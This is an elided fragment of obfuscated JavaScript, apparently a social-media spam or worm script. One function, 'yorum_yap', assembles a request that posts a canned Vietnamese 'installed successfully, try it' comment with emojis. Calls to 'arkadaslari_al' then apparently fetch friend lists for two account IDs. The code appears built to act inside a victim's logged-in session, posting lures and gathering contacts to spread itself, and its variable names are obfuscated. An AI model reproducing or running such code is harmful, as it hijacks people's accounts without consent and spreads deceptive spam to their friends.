...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=(Y) Cài Đặt  Thành Công 😍 🌹 Các Bạn Làm Thử Đi 💖 🎁 💋 💐 ☕' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(737798232921695);
arkadaslari_al(451103045022008);